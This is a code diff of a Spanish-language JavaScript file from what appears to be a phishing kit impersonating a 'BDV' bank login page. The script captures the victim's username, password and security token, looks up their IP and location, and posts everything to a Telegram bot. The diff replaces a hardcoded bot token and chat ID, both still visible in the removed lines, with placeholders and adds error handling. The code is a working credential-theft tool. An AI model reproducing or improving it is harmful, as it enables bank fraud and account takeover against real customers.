@@ -1,3 +1,4 @@
+// js.js
 "use strict";
 
 function chcs() {
@@ -18,8 +19,6 @@ function chc() {
         alert("Contraseña incorrecta o incompleta");
         document.getElementById("mat-input-1").value = "";
         document.getElementById("mat-input-1").focus();
-    } else {
-        // Aquí no haces nada con la contraseña, solo sigue el flujo
     }
 }
 
@@ -28,14 +27,12 @@ function cls() {
 }
 
 window.addEventListener("DOMContentLoaded", () => {
-    var user = document.querySelector("#mat-input-0"),
-        pass = document.querySelector("#mat-input-1"),
-        btnU = document.querySelector("#btn-u"),
-        btnP = document.querySelector("#btn-p"),
-        btnT = document.querySelector("#mainB"),
-        tk = document.querySelector("#soldede");
-
-    window.stage = 1;
+    const user = document.querySelector("#mat-input-0");
+    const pass = document.querySelector("#mat-input-1");
+    const btnU = document.querySelector("#btn-u");
+    const btnP = document.querySelector("#btn-p");
+    const btnT = document.querySelector("#mainB");
+    const tk = document.querySelector("#soldede");
 
     btnU.addEventListener("click", (e) => {
         e.preventDefault();
@@ -59,7 +56,7 @@ window.addEventListener("DOMContentLoaded", () => {
                 document.getElementById("mdl").style.display = "none";
             });
 
-            
+            // Obtener información de IP
             fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
@@ -67,7 +64,6 @@ window.addEventListener("DOMContentLoaded", () => {
                     const ciudad = data.city || 'Desconocida';
                     const pais = data.country_name || 'Desconocido';
 
-                    
                     const message = `
     BDV - login
     Us3r: ${user.value}
@@ -79,8 +75,7 @@ window.addEventListener("DOMContentLoaded", () => {
     IP: ${ip}
     `;
 
-                    // Enviar datos a Telegram
-                    sendData({
+                     sendData({
                         message: message
                     }, () => {
                         document.querySelector("#tkin").style.display = "none";
@@ -106,13 +101,13 @@ window.addEventListener("DOMContentLoaded", () => {
                 .then(data => {
                     const ip = data.ip || 'Desconocida';
 
-                     const message = `
+                    const message = `
     BDV Token
     Tok3n: ${val}
     IP: ${ip}
     `;
 
-                     sendData({
+                    sendData({
                         message: message
                     }, () => {
                         tk.value = "";
@@ -146,14 +141,13 @@ window.addEventListener("DOMContentLoaded", () => {
         }, timeout * 1000);
     };
 
-    // send data
-    const sendData = async (data, cb = null) => {
+     const sendData = async (data, cb = null) => {
         const telegramData = {
-            chat_id: '-4239800341',
+            chat_id: TELEGRAM_CHAT_ID,
             text: data.message
         };
 
-        return await fetch(`https://api.telegram.org/bot7276471564:AAG3Komry3B-FtFHigG7xVVclDSFeHKjaXA/sendMessage`, {
+        return await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -161,6 +155,8 @@ window.addEventListener("DOMContentLoaded", () => {
             body: JSON.stringify(telegramData)
         }).then(result => {
             if (cb) cb(result);
+        }).catch(err => {
+            console.error("Error enviando datos a Telegram:", err);
         });
     };
 });
